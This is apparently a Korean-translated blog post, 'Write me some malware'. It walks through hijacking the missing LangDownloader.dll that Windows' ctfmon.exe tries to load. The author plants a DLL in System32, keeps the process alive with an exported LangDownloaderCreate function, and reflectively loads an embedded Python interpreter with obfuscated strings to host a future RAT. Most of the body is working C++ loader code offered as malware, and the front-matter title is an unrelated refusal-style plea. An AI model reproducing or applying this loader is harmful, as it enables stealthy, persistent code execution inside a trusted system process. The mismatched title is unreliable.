---
title: "제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다"
description: ""
coverImage: "/assets/img/2024-06-19-Writemesomemalware_0.png"
date: 2024-06-19 01:15
ogImage: 
  url: /assets/img/2024-06-19-Writemesomemalware_0.png
tag: Tech
originalTitle: "Write me some malware"
link: "https://medium.com/@shaharb02/write-me-some-malware-fbfd131db495"
---


(연구 목적으로만 사용)

# 이루고 싶은 것:

# 어떻게 로드할 것인가:

Windows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.

<div class="content-ad"></div>

```
![이미지](/assets/img/2024-06-19-Writemesomemalware_0.png)

- 높은 권한에서 실행됩니다.
- 충돌/중단 시 다시 시작하는 서비스가 있습니다.
- 모든 Windows 컴퓨터에서 실행됩니다.
```

<div class="content-ad"></div>

해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.

"virtual alloc — create remote thread" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.

## ctfmon.exe에 로드하는 멋진 방법 찾기

Procmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.

<div class="content-ad"></div>

```
<img src="/assets/img/2024-06-19-Writemesomemalware_1.png" />

음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.

<img src="/assets/img/2024-06-19-Writemesomemalware_2.png" />

LangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.
```

<div class="content-ad"></div>

```js
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {

    case DLL_PROCESS_ATTACH:
        {
        MessageBoxA(0, std::to_string(GetCurrentProcessId()).c_str(), 0, 0);
        break;
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(

LangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.

![이미지](/assets/img/2024-06-19-Writemesomemalware_3.png)
```

<div class="content-ad"></div>

이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?

Procmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요

![image](/assets/img/2024-06-19-Writemesomemalware_4.png)

여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.

<div class="content-ad"></div>

해당 문자열을 찾았습니다!

![image](/assets/img/2024-06-19-Writemesomemalware_5.png)

여기서 잘 로드되고 있네요. 이제 뭘 할까요?

![image](/assets/img/2024-06-19-Writemesomemalware_6.png)

<div class="content-ad"></div>

한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:

![image 1](/assets/img/2024-06-19-Writemesomemalware_7.png)

![image 2](/assets/img/2024-06-19-Writemesomemalware_8.png)

이 코드를 한 번 분석해 봐요.

<div class="content-ad"></div>

```js
• LangDownloader.dll을로드하려고 시도합니다.
• 실패하는 경우
  - “종료”로 계속 진행합니다.
• 성공하는 경우
  - LangDownloaderCreate의 주소를 가져오려고 시도합니다.
  - 실패하는 경우
     프로세스 종료
  - 성공하는 경우
     매개변수와 함께 LangDownloaderCreate를 호출합니다
```

지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.

<img src="/assets/img/2024-06-19-Writemesomemalware_9.png" />

우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.
```

<div class="content-ad"></div>

```js
extern "C" __declspec(dllexport) int LangDownloaderCreate(int a, int b)
{
    // 영원히 기다려요
    HANDLE never_set = CreateEventA(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(never_set, INFINITE);

    return -1;
}
```

알겠어요!

![이미지](/assets/img/2024-06-19-Writemesomemalware_10.png)

이제 실행 중이니까... 뭘 하고 싶어요?

<div class="content-ad"></div>

# 무엇을 실행할까요:

제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요

배운 바에 의하면, 파이썬은 python`버전`.dll을 사용해서 모든 파이썬 작업을 처리해요

이 .dll을 멋지게 C++ 인터페이스로 감싸봐요

<div class="content-ad"></div>

```js
class PythonInterpreter
{
public:
    explicit PythonInterpreter();
    ~PythonInterpreter();

    NO_DISCARD void* run_line(const std::string& line);

    // Deleted Functions
    PythonInterpreter(const PythonInterpreter& other) = delete;
    PythonInterpreter(PythonInterpreter&& other) = delete;
    PythonInterpreter& operator=(const PythonInterpreter& other) = delete;
    PythonInterpreter& operator=(PythonInterpreter&& other) = delete;

private:
    using PyObject = int;

    using PyInitializeType = void (*)();
    using PyFinalizeType = void (*)();
    using PyRunSimpleStringType = PyObject * (*)(const char* str);

    // Members
    DynamicLibrary m_python_interpreter_library;
    PyInitializeType m_initialize;
    PyFinalizeType m_finalize;
    PyRunSimpleStringType m_run_simple_string;
};

PythonInterpreter::PythonInterpreter() :
    m_python_interpreter_library(WindowsResource::get_resource(GetModuleHandleA(OBFUSCATE("LangDownloader.dll")),
                                                               IDR_BINARY1,
                                                               OBFUSCATE("Binary"))),
    m_initialize(static_cast<PyInitializeType>(m_python_interpreter_library.get_function(OBFUSCATE("Py_Initialize")))),
    m_finalize(static_cast<PyFinalizeType>(m_python_interpreter_library.get_function(OBFUSCATE("Py_Finalize")))),
    m_run_simple_string(static_cast<PyRunSimpleStringType>(m_python_interpreter_library.get_function(OBFUSCATE("PyRun_SimpleString"))))
{
    m_initialize();
}
```

이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.

DynamicLibrary 클래스를 만들어야 합니다.

```js
class DynamicLibrary
{
public:
    explicit DynamicLibrary(ByteSpan library_binary);
    ~DynamicLibrary();

    NO_DISCARD void* get_function(const std::string& function_name);

    // Deleted Functions
    DynamicLibrary(const DynamicLibrary& other) = delete;
    DynamicLibrary(DynamicLibrary&& other) = delete;
    DynamicLibrary& operator=(const DynamicLibrary& other) = delete;
    DynamicLibrary& operator=(DynamicLibrary&& other) = delete;

private:
    NO_DISCARD static HMEMORYMODULE load_library(ByteSpan library_binary);

    // Members
    HMEMORYMODULE m_library_base;
};
```

<div class="content-ad"></div>

이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!

![이미지](/assets/img/2024-06-19-Writemesomemalware_11.png)

정말 멋지죠? 

이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.

<div class="content-ad"></div>

미안해요! 전손을 올립니다(:

![Image](/assets/img/2024-06-19-Writemesomemalware_12.png)